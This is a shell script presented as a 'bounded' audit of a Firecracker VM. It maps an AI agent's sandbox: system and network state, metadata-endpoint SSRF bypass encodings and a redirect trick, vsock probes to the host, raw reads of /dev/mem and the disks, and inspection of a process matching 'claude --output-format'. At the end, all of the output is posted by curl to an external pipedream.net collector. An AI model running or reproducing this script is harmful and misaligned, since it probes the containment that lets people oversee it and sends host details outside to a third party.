#!/bin/sh
# diag4.sh - bounded Firecracker/managed-VM audit probes
# Usage:
#   COLLECTOR_URL="https://your-collector.example/path" sh diag4.sh
#
# Notes:
# - This is intentionally narrow: no broad port scans, no disk dumps, no credential retrieval.
# - It focuses on local control-plane reachability, private/reserved egress filtering,
#   metadata blocking behavior, vsock presence, and sensitive device access controls.

COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"

run() {
  echo
  echo "### $*"
  "$@" 2>&1
}

safe_head() {
  # safe_head FILE BYTES
  f="$1"
  n="${2:-64}"
  echo "=== $f ==="
  ls -l "$f" 2>&1 || true
  timeout 1 dd if="$f" bs=1 count="$n" 2>/tmp/diag4.dd.err | xxd -g1 -l "$n" 2>&1 || true
  cat /tmp/diag4.dd.err 2>/dev/null || true
  rm -f /tmp/diag4.dd.err
}

(
set -x

echo "=== basic identity ==="
date
id
uname -a
cat /proc/cmdline 2>&1 || true
cat /proc/version 2>&1 || true
capsh --print 2>&1 || true

echo
echo "=== mounts and block devices ==="
mount 2>&1 || true
lsblk -f 2>&1 || true
blkid 2>&1 || true
cat /proc/partitions 2>&1 || true

echo
echo "=== network inventory ==="
hostname -I 2>&1 || true
cat /proc/net/dev 2>&1 || true
cat /proc/net/route 2>&1 || true
cat /proc/net/arp 2>&1 || true
cat /proc/net/tcp 2>&1 || true
cat /proc/net/tcp6 2>&1 || true
cat /etc/resolv.conf 2>&1 || true
cat /etc/hosts 2>&1 || true

echo
echo "=== candidate IPs from local state ==="
{
  cat /proc/net/route 2>/dev/null
  cat /proc/net/tcp 2>/dev/null
  cat /proc/net/tcp6 2>/dev/null
  cat /proc/net/arp 2>/dev/null
  cat /etc/resolv.conf 2>/dev/null
  env 2>/dev/null
} | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u || true

echo
echo "=== local/process listeners from /proc/net/tcp decoded ==="
python3 - <<'PY' 2>&1 || true
import socket

states = {
    "01": "ESTABLISHED",
    "02": "SYN_SENT",
    "03": "SYN_RECV",
    "04": "FIN_WAIT1",
    "05": "FIN_WAIT2",
    "06": "TIME_WAIT",
    "07": "CLOSE",
    "08": "CLOSE_WAIT",
    "09": "LAST_ACK",
    "0A": "LISTEN",
    "0B": "CLOSING",
}

def decode_addr(hexaddr):
    ip_hex, port_hex = hexaddr.split(":")
    ip = socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1])
    port = int(port_hex, 16)
    return ip, port

with open("/proc/net/tcp", "r", encoding="utf-8", errors="replace") as f:
    next(f, None)
    for line in f:
        parts = line.split()
        if len(parts) < 4:
            continue
        lip, lp = decode_addr(parts[1])
        rip, rp = decode_addr(parts[2])
        st = states.get(parts[3], parts[3])
        print(f"{st:13s} local={lip}:{lp} remote={rip}:{rp} inode={parts[9] if len(parts) > 9 else '?'}")
PY

echo
echo "=== fixed TCP reachability probe using python sockets ==="
python3 - <<'PY' 2>&1 || true
import socket

targets = [
    "127.0.0.1",
    "0.0.0.0",
    "192.0.2.1",
    "192.0.2.2",
    "169.254.169.254",
]

ports = [22, 53, 80, 443, 2024, 2025, 8080, 8443]

for host in targets:
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        try:
            s.connect((host, port))
            print(f"OPEN {host}:{port}")
        except Exception as e:
            print(f"FAIL {host}:{port} {type(e).__name__}: {e}")
        finally:
            s.close()
PY

echo
echo "=== local control-plane HTTP passive probe ==="
for h in 127.0.0.1 0.0.0.0 192.0.2.2; do
  for p in 2024 2025; do
    for path in / /health /version /status /metrics; do
      echo "--- http://$h:$p$path"
      timeout 2 curl -i -sS --max-time 2 "http://$h:$p$path" 2>&1 | sed -n '1,40p'
    done
  done
done

echo
echo "=== metadata/private egress benign probes ==="
for u in \
  "http://169.254.169.254/" \
  "http://169.254.169.254/latest/meta-data/" \
  "http://169.254.169.254/computeMetadata/v1/" \
  "http://10.0.0.1/" \
  "http://172.16.0.1/" \
  "http://192.168.0.1/" \
  "http://100.64.0.1/" \
  "http://192.0.2.1/" \
  "http://198.18.0.1/"
do
  echo "--- $u"
  timeout 3 curl -i -sS --max-time 3 "$u" 2>&1 | sed -n '1,25p'
done

echo
echo "=== private/reserved IP representation probes ==="
for u in \
  "http://2852039166/" \
  "http://0xA9FEA9FE/" \
  "http://0251.0376.0251.0376/" \
  "http://169.254.169.254.nip.io/" \
  "http://metadata.google.internal/" \
  "http://[::ffff:169.254.169.254]/"
do
  echo "--- $u"
  timeout 3 curl -i -sS --max-time 3 "$u" 2>&1 | sed -n '1,25p'
done

echo
echo "=== redirect-to-private probe if python is available ==="
python3 - <<'PY' 2>&1 || true
# Starts a tiny local one-shot HTTP server on 127.0.0.1 that redirects to metadata.
# Then uses curl against it. This tests whether the client/filter blocks private IPs
# after redirects. It does not retrieve credentials.
import http.server
import socketserver
import subprocess
import threading
import time

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://169.254.169.254/")
        self.end_headers()
    def log_message(self, fmt, *args):
        pass

with socketserver.TCPServer(("127.0.0.1", 0), Handler) as httpd:
    port = httpd.server_address[1]
    t = threading.Thread(target=httpd.handle_request, daemon=True)
    t.start()
    time.sleep(0.1)
    print(f"local_redirect_port={port}")
    p = subprocess.run(
        ["curl", "-i", "-sS", "--max-time", "3", "-L", f"http://127.0.0.1:{port}/"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=5,
    )
    print("\n".join(p.stdout.splitlines()[:40]))
PY

echo
echo "=== vsock inventory ==="
ls -l /dev/vsock 2>&1 || true
cat /proc/net/vsock 2>&1 || true
grep -i vsock /proc/modules 2>/dev/null || true
find /sys -iname '*vsock*' -print 2>/dev/null | head -100 || true
grep -R . /sys/class/vsock /sys/devices 2>/dev/null | grep -i vsock | head -100 || true
dmesg 2>/dev/null | grep -iE 'vsock|virtio|firecracker' | tail -100 || true

echo
echo "=== vsock python support and narrow host probe ==="
python3 - <<'PY' 2>&1 || true
import socket

print("AF_VSOCK:", getattr(socket, "AF_VSOCK", None))
print("VMADDR_CID_HOST:", getattr(socket, "VMADDR_CID_HOST", None))

AF_VSOCK = getattr(socket, "AF_VSOCK", None)
if AF_VSOCK is None:
    raise SystemExit

host_cid = getattr(socket, "VMADDR_CID_HOST", 2)
ports = [80, 443, 1024, 2024, 2025, 5000, 8000, 8080, 8443]

for port in ports:
    s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
    s.settimeout(1.0)
    try:
        s.connect((host_cid, port))
        print(f"VSOCK_OPEN host_cid={host_cid} port={port}")
    except Exception as e:
        print(f"VSOCK_FAIL host_cid={host_cid} port={port} {type(e).__name__}: {e}")
    finally:
        s.close()
PY

echo
echo "=== sensitive device access-control probe, tiny reads only ==="
for f in /dev/mem /dev/port /dev/kmsg /dev/snapshot /dev/vsock /dev/vda /dev/vdb /dev/vdc /dev/vdd /dev/vde; do
  echo "=== $f ==="
  ls -l "$f" 2>&1 || true
  timeout 1 dd if="$f" bs=1 count=32 2>/tmp/diag4.dd.err | xxd -g1 -l32 2>&1 || true
  echo "dd_rc=$?"
  cat /tmp/diag4.dd.err 2>/dev/null || true
  rm -f /tmp/diag4.dd.err
done

echo
echo "=== proc isolation/cap/seccomp status ==="
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp|Uid|Gid' /proc/self/status 2>&1 || true
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp|Uid|Gid' /proc/1/status 2>&1 || true
cat /proc/sys/kernel/yama/ptrace_scope 2>&1 || true

echo
echo "=== agent process visibility, redacted ==="
ps auxww 2>&1 | sed -E \
  -e 's/([A-Za-z0-9_]*(TOKEN|SECRET|PASSWORD|KEY)[A-Za-z0-9_]*=)[^ ]+/\1<redacted>/Ig' \
  -e 's/(--append-system-prompt ).*/\1<redacted>/g' \
  | sed -n '1,120p'

pid="$(pgrep -f 'claude --output-format|environment-manager task-run|process_api' | head -1 || true)"
echo "selected_pid=$pid"
if [ -n "$pid" ]; then
  echo "--- /proc/$pid/status"
  grep -E 'Name|Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' "/proc/$pid/status" 2>&1 || true

  echo "--- /proc/$pid/fd listing only"
  ls -l "/proc/$pid/fd" 2>&1 | sed -n '1,120p'

  echo "--- /proc/$pid/environ keys only/redacted"
  tr '\0' '\n' < "/proc/$pid/environ" 2>&1 \
    | sed -E 's/^([^=]*(TOKEN|SECRET|PASSWORD|KEY|AUTH|CREDENTIAL)[^=]*)=.*/\1=<redacted>/I' \
    | sed -n '1,120p'
fi

) 2>&1 | curl -s -m 10 -X POST --data-binary @- "$COLLECTOR_URL"
